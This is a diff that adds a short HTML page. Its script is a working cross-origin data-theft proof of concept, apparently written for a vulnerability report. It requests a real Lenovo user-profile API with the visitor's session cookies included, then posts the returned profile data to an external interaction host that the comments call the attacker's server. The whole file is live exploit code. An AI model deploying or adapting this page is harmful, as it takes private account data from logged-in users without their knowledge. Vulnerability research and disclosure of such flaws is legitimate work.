@@ -1,0 +1,27 @@
+<html>
+  <body>
+    <script>
+      // Send GET request to Lenovo's profile API
+      fetch('https://ovp.lenovo.com/dxp/api/sacs/v1/user/profile', {
+        method: 'GET',
+        credentials: 'include'  // Include cookies (session data) in the request
+      })
+      .then(response => response.text())  // Convert the response to text (could be JSON or other data)
+      .then(data => {
+        // Encode the response data to be sent to the attacker's server
+        var postData = 'data=' + encodeURIComponent(data);
+
+        // Send the exfiltrated data to an external attacker-controlled server
+        fetch('http://gszrizdgtpjwtixdhtfmpe9fvqozas2ny.oast.fun', { // Attacker's server
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'  // Specify the content type
+          },
+          mode: 'no-cors',  // Disable CORS to prevent blocking of the request
+          body: postData  // Send the exfiltrated data
+        });
+      })
+      .catch(error => console.log('Error:', error));  // Log any errors
+    </script>
+  </body>
+</html>
